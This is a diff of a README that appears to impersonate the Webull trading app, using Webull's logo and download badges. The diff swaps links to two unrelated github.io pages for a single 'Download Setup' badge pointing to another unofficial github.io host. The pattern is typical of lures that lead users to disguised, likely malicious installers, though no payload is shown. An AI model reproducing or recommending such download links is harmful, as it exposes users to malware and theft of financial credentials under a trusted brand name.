@@ -4,15 +4,7 @@
 <img src="https://play-lh.googleusercontent.com/dLn8zRMMdHIff5O7JIKiMvxVElieK09hUsMneLPLWiTaq2JvQzst9ZeVIHlvpYC1co8" alt="Webull App Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://osx-get-software.github.io/.github/webull-app">  
-<img src="https://img.shields.io/badge/⬇️_Download_Webull_for_macOS-blue?style=for-the-badge&logo=apple" alt="Download Webull App for macOS">  
-</a>  
-
-<a href="https://webull-desktop.github.io/.github">  
-<img src="https://img.shields.io/badge/⬇️_Download_Webull_for_Windows-orange?style=for-the-badge&logo=windows" alt="Download Webull App for Windows">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://damirmorseussk.github.io/.github/Webull-Desktop)
 
 ---
 
